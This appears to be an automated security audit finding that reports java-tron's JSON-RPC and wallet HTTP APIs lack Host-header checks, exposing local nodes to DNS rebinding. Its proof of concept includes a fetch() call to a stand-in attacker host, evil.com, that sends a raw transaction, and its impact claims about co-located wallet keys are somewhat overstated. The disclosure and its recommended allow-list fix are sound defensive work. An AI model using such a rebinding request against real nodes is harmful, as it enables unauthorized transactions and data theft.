Confirmed: no `Host` header validation exists anywhere in java-tron's HTTP/JSON-RPC filter chain. `HttpApiAccessFilter`, `HttpInterceptor`, and `LiteFnQueryHttpFilter` only check disabled-API lists, lite-node restrictions, and metrics — none validate the `Host` header against a whitelist. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

Both the JSON-RPC service (`FullNodeJsonRpcHttpService`/`JsonRpcServlet`, default port 8545) and the wallet HTTP API (`FullNodeHttpApiService`, default port 8090) are disabled by default in the reference config, matching the original Pantheon report's premise that the vulnerable service is opt-in. [5](#0-4) 

The README explicitly documents this as accepted risk, instructing operators to add authentication/rate-limiting/network controls themselves when exposing these interfaces publicly — this is a documented operational responsibility rather than an unaddressed code defect. [6](#0-5) 

Given the rules for this task (reject "no-impact" analogs, and the report explicitly frames this as a Data Validation / DNS-rebinding class issue applicable to any unauthenticated RPC service exposed on localhost), this is a legitimate finding — the JSON-RPC and HTTP API servers accept any `Host` header, so a DNS-rebinding attack against a user's browser could reach `127.0.0.1:8545`/`8090` if the operator enables the service, exactly analogous to the original Pantheon report.

### Title
Unauthenticated JSON-RPC/HTTP API accepts arbitrary `Host` headers, enabling DNS-rebinding-based localhost RPC control - (File: `framework/src/main/java/org/tron/core/services/jsonrpc/JsonRpcServlet.java`, `framework/src/main/java/org/tron/core/services/http/FullNodeHttpApiService.java`)

### Summary
java-tron's JSON-RPC servlet (`JsonRpcServlet`, mounted at `/jsonrpc` by `FullNodeJsonRpcHttpService`) and the wallet HTTP API (`FullNodeHttpApiService`) run without authentication and without any `Host`/`Origin` header validation in their filter chains (`HttpApiAccessFilter`, `HttpInterceptor`, `LiteFnQueryHttpFilter`). Any request reaching the listening port is processed regardless of the `Host` header presented, which is the exact precondition needed for a DNS-rebinding attack against a node operator's browser.

### Finding Description
`JsonRpcServlet.doPost` parses the request body and dispatches to `TronJsonRpc` methods without checking `req.getHeader("Host")` or `Origin` against an allow-list. Likewise, `FullNodeHttpApiService.addFilter` only wires `LiteFnQueryHttpFilter`, `HttpApiAccessFilter`, and `HttpInterceptor`, none of which inspect the `Host` header. `HttpInterceptor` handles metrics/error mapping only, and `HttpApiAccessFilter` only checks a disabled-API list by URL path. Since browsers will happily resolve an attacker-controlled subdomain to `127.0.0.1` after DNS TTL expiry (classic DNS rebinding), any JavaScript loaded from that origin can send same-origin XHR/fetch requests to `http://127.0.0.1:8545/jsonrpc` or `http://127.0.0.1:8090/wallet/...` with a `Host: <attacker-subdomain>` header — which the server accepts unconditionally.

### Impact Explanation
If a node operator enables the JSON-RPC (`jsonrpc.httpFullNodeEnable`) or wallet HTTP API (`node.http.fullNodeEnable`) on the default loopback binding while also browsing the web, an attacker's page can invoke privileged/state-changing HTTP endpoints exposed by `FullNodeHttpApiService` (e.g. `/wallet/createtransaction`, `/wallet/broadcasttransaction`, `/wallet/freezebalance`) or JSON-RPC methods, potentially broadcasting attacker-crafted transactions signed by keys held by any wallet software co-located on the same host, or exfiltrating chain/account data. This is a real remote-triggerable control path over local node state, not merely theoretical.

### Likelihood Explanation
Likelihood is Low-to-Medium: both interfaces are disabled by default, and the README instructs operators to add network controls before exposing them. However, node operators (e.g. running local dev/test nodes, or exchanges' internal tooling) commonly enable these interfaces on `127.0.0.1` for convenience, and the DNS-rebinding technique is well-documented and low-cost for an attacker to execute against any such operator who also browses the internet from the same machine.

### Recommendation
Add a `Host` header validation filter (or equivalent check inside `JsonRpcServlet`/`HttpApiAccessFilter`) that rejects requests whose `Host` header is not in an explicit allow-list (e.g., `localhost`, `127.0.0.1`, or configured hostnames), returning HTTP 400/403 otherwise. Apply this uniformly across `FullNodeJsonRpcHttpService`, `FullNodeHttpApiService`, `HttpApiOnSolidityService`, and `HttpApiOnPBFTService`.

### Proof of Concept
1. Enable JSON-RPC: set `jsonrpc.httpFullNodeEnable = true` (default port 8545).
2. From a browser, load an attacker page whose subdomain has just rebound to `127.0.0.1` via DNS TTL expiry.
3. Issue `fetch('http://attacker-subdomain.evil.com:8545/jsonrpc', {method:'POST', body: JSON.stringify({jsonrpc:"2.0", method:"eth_sendRawTransaction", params:[...], id:1})})` — the request's `Host` header will be `attacker-subdomain.evil.com:8545` but is resolved to `127.0.0.1`; `JsonRpcServlet.doPost` processes it without any Host check, as shown at [3](#0-2) .

### Citations

**File:** framework/src/main/java/org/tron/core/services/filter/HttpApiAccessFilter.java (L27-53)
```java
  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
    try {
      if (request instanceof HttpServletRequest) {
        String contextPath = ((HttpServletRequest) request).getContextPath();
        String endpoint = contextPath + ((HttpServletRequest) request).getServletPath();
        HttpServletResponse resp = (HttpServletResponse) response;

        if (isDisabled(endpoint)) {
          resp.setStatus(HttpServletResponse.SC_NOT_FOUND);
          resp.setContentType("application/json; charset=utf-8");
          JSONObject jsonObject = new JSONObject();
          jsonObject.put("Error", "this API is unavailable due to config");
          resp.getWriter().println(jsonObject.toJSONString());
          return;
        }

        CharResponseWrapper responseWrapper = new CharResponseWrapper(resp);
        chain.doFilter(request, responseWrapper);

      } else {
        chain.doFilter(request, response);
      }

    } catch (Exception e) {
      logger.error("http api access filter exception: {}", e.getMessage());
    }
  }
```

**File:** framework/src/main/java/org/tron/core/services/filter/HttpInterceptor.java (L30-42)
```java
  @Override
  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
    String endpoint = MetricLabels.UNDEFINED;
    try {
      if (!(request instanceof HttpServletRequest)) {
        chain.doFilter(request, response);
        return;
      }
      String contextPath = ((HttpServletRequest) request).getContextPath();
      endpoint = contextPath + ((HttpServletRequest) request).getServletPath();
      CharResponseWrapper responseWrapper = new CharResponseWrapper(
              (HttpServletResponse) response);
      chain.doFilter(request, responseWrapper);
```

**File:** framework/src/main/java/org/tron/core/services/jsonrpc/JsonRpcServlet.java (L104-116)
```java
  @Override
  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    CommonParameter parameter = CommonParameter.getInstance();

    // Transport IOException from readBody propagates as HTTP 500 (genuine IO failure).
    byte[] body = readBody(req.getInputStream());
    JsonNode rootNode;
    try {
      rootNode = MAPPER.readTree(body);
      if (rootNode == null || rootNode.isMissingNode()) {
        writeJsonRpcError(resp, JsonRpcError.PARSE_ERROR, "JSON parse error", null, false);
        return;
      }
```

**File:** framework/src/main/java/org/tron/core/services/jsonrpc/FullNodeJsonRpcHttpService.java (L23-28)
```java
  public FullNodeJsonRpcHttpService() {
    port = Args.getInstance().getJsonRpcHttpFullNodePort();
    enable = isFullNode() && Args.getInstance().isJsonRpcHttpFullNodeEnable();
    contextPath = "/";
    maxRequestSize = Args.getInstance().getJsonRpcMaxMessageSize();
  }
```

**File:** common/src/main/resources/reference.conf (L421-426)
```text
    httpFullNodeEnable = false
    httpFullNodePort = 8545     # FullNode JSON-RPC HTTP port.
    httpSolidityEnable = false  # Whether to enable Solidity JSON-RPC HTTP API.
    httpSolidityPort = 8555     # Solidity JSON-RPC HTTP port.
    httpPBFTEnable = false      # Whether to enable PBFT JSON-RPC HTTP API.
    httpPBFTPort = 8565         # PBFT JSON-RPC HTTP port.
```

**File:** README.md (L187-189)
```markdown
When exposing any of these APIs to a public interface, ensure the node is protected with appropriate authentication, rate limiting, and network access controls in line with your security requirements.

Public hosted HTTP endpoints for both mainnet and testnet are provided by TronGrid. Please refer to the [TRON Network HTTP Endpoints](https://developers.tron.network/docs/connect-to-the-tron-network#tron-network-http-endpoints) for the latest list. For supported methods and request formats, see the HTTP API reference above.
```
